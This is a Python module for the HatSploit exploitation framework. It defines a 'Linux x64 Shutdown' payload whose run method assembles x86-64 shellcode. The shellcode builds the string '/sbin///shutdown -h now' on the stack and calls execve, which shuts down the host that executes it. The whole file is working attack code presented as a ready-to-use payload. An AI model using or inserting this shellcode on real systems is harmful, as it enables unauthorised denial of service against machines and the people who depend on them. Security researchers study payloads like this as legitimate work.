#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload
from hatsploit.utils.payload import PayloadTools


class HatSploitPayload(Payload, PayloadTools):
    details = {
        'Category': "stager",
        'Name': "Linux x64 Shutdown",
        'Payload': "linux/x64/shutdown",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Shutdown payload for Linux x64.",
        'Architecture': "x64",
        'Platform': "linux",
        'Rank': "low",
        'Type': "one_side"
    }

    def run(self):
        return self.assemble(
            self.details['Architecture'],
            """
            start:
                xor rax, rax
                xor rdx, rdx

                push rax
                push byte 0x77
                push word 0x6f6e
                mov rbx, rsp

                push rax
                push word 0x682d
                mov rcx, rsp

                push rax
                mov r8, 0x2f2f2f6e6962732f
                mov r10, 0x6e776f6474756873
                push r10
                push r8
                mov rdi, rsp

                push rdx
                push rbx
                push rcx
                push rdi
                mov rsi, rsp

                add rax, 59
                syscall
            """
        )
